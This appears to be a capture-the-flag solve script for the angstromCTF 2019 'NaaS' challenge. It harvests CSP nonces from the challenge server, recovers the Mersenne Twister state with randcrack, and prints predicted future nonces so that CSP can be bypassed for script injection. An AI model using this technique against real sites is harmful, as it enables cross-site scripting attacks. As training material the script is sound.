from randcrack import RandCrack

rc = RandCrack()

import binascii
import base64
import requests

requests.get('https://naas.2019.chall.actf.co/status')

noncehtml = "<script></script>"*156
nonces = requests.post('https://naas.2019.chall.actf.co/nonceify', data=noncehtml).json()["csp"].strip("script-src 'nonce-").strip(";").split("' 'nonce-")

bits = []

for nonce in nonces:
	h = binascii.hexlify(base64.b64decode(nonce))
	for i in range(0, len(h), 8):
		bits.append(int(h[i:i+8], 16))

for i in range(0, len(bits), 4):
	bits[i], bits[i+1], bits[i+2], bits[i+3] = bits[i+3], bits[i+2], bits[i+1], bits[i]

for b in bits:
	rc.submit(b)

print(str(base64.b64encode(binascii.unhexlify(hex(rc.predict_getrandbits(128))[2:].zfill(32))), encoding="ascii"))
print(str(base64.b64encode(binascii.unhexlify(hex(rc.predict_getrandbits(128))[2:].zfill(32))), encoding="ascii"))
